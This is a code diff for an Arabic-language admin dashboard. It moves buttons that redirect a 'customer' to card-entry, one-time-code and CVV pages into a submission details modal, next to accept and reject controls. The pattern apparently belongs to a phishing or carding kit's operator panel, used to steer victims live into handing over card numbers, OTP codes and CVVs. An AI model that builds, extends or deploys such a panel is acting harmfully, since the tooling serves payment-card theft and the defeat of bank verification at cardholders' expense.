@@ -417,14 +417,6 @@
         '<td>'+statusBadge(s.status)+'</td>' +
         '<td class="td-actions">' +
           '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
-          '<div class="redirect-wrap">' +
-            '<button class="tbl-btn redirect" onclick="toggleRedirectMenu(this,\''+s.id+'\')">إعادة التوجيه ▾</button>' +
-            '<div class="redirect-menu">' +
-              '<button onclick="redirectUser(\''+s.id+'\',\'card\')">صفحة البطاقة</button>' +
-              '<button onclick="redirectUser(\''+s.id+'\',\'otp\')">صفحة الكود</button>' +
-              '<button onclick="redirectUser(\''+s.id+'\',\'cvv\')">صفحة CVV</button>' +
-            '</div>' +
-          '</div>' +
         '</td>' +
       '</tr>';
     }).join('');
@@ -571,14 +563,25 @@
       '<div class="detail-row"><span class="detail-label">الوقت</span><span class="detail-value" style="font-family:inherit;direction:rtl">'+fmtTime(s.time)+'</span></div>';
 
     const actions = document.getElementById('modalActions');
+    const redirectBtns =
+      '<div style="width:100%;border-top:1px solid var(--line);padding-top:12px;margin-top:4px">' +
+        '<div style="font-size:14px;font-weight:800;color:var(--ink-soft);margin-bottom:8px;text-align:center">إعادة توجيه العميل إلى:</div>' +
+        '<div style="display:flex;gap:8px">' +
+          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'card\')">صفحة البطاقة</button>' +
+          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'otp\')">صفحة الكود</button>' +
+          '<button class="modal-btn" style="background:#e8d5f5;color:#7b1fa2" onclick="redirectUser(\''+id+'\',\'cvv\')">صفحة CVV</button>' +
+        '</div>' +
+      '</div>';
+
     if (s.status === 'accepted') {
-      actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>';
+      actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>' + redirectBtns;
     } else if (s.status === 'rejected') {
-      actions.innerHTML = '<div class="modal-status" style="color:var(--red);width:100%">تم الرفض ✗</div>';
+      actions.innerHTML = '<div class="modal-status" style="color:var(--red);width:100%">تم الرفض ✗</div>' + redirectBtns;
     } else {
       actions.innerHTML =
         '<button class="modal-btn accept" onclick="doAction(\'accept\',\''+id+'\')">قبول</button>' +
-        '<button class="modal-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>';
+        '<button class="modal-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>' +
+        redirectBtns;
     }
 
     document.getElementById('modalOverlay').classList.add('open');
@@ -601,13 +604,13 @@
   });
 
   async function redirectUser(id, page) {
-    document.querySelectorAll('.redirect-menu.open').forEach(m => m.classList.remove('open'));
     try {
       await fetch('/api/admin/redirect/'+id, {
         method: 'POST',
         headers: { 'Authorization': 'Bearer '+token(), 'Content-Type': 'application/json' },
         body: JSON.stringify({ page: page })
       });
+      closeModal();
       loadData();
     } catch(e) {}
   }
